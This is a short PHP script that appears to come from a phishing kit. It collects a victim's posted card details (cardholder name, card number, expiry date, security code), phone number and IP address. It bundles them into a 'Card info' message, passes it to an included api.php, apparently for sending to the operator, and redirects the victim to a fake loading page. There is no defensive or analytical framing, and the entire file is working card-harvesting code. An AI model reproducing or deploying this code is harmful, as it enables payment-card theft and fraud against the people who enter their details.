<?php

session_start();



$xuser = $_SESSION['xuser'] = $_POST['xuser'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expiryMonth = $_SESSION['expiryMonth'] = $_POST['expiryMonth'];
$expiryYear = $_SESSION['expiryYear'] = $_POST['expiryYear'];
$csc = $_SESSION['csc'] = $_POST['csc'];
$phone = $_SESSION['phone'] = $_POST['phone'];

$hexor = '
# Card info 💳💳
# Cardholder Name : '.$_SESSION["xuser"].' 
# Card Number : '.$_SESSION["cardnumber"].' 
# Expiry Date : '.$_SESSION["expiryMonth"].'/'.$_SESSION['expiryYear'].'
# SecurityCode : '.$_SESSION["csc"].'
# Phone : '.$_SESSION["phone"].'
# IP Address : '.$_SERVER['REMOTE_ADDR'].' 
';



include("api.php"); 



header('Location: ../loading1.php');


?>


